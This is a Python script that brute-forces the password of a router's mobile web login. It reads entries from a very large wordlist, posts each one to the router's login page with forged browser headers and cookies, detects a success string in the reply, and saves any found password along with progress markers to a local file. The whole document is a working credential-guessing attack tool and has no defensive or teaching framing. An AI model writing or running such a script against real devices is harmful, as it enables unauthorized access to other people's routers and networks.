import requests
from itertools import islice
import sys
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
    'Cookie':'LOGINCOUNT=1; LOGIN_PSD_REM_FLAG=0; PSWMOBILEFLAG=true'
}
 
def post(passwd):
    data="psd="+passwd
    res = requests.post(url="http://192.168.124.1/router_password_mobile.asp"
                    ,data=data,headers=headers)
    if('var resultInfo="true;0";' in res.text):
        return True
    else:
        return False
  
def record(content):
    with open("E:/work/36.4GB-18_in_1.lst/passwd.txt", 'w') as file:
        file.write(content)
    
def readDic(skip):
    linenum = skip - 1
    with open("E:/work/36.4GB-18_in_1.lst/18_in_1.lst", 'r') as file:
         for line in islice(file,skip,None):
            linenum = linenum+1
            line=line.replace('\n',"")
            res=post(line)
            print(str(linenum)+" "+line+" "+str(res), end="|")
            if(res):
                print("FOUND!")
                record("FOUND! "+str(linenum)+" "+line+" "+str(res))
                break
            if(linenum%1000 == 0):
                record(str(linenum)+" "+line+" "+str(res))
if __name__ == "__main__":
           
    readDic(0)             
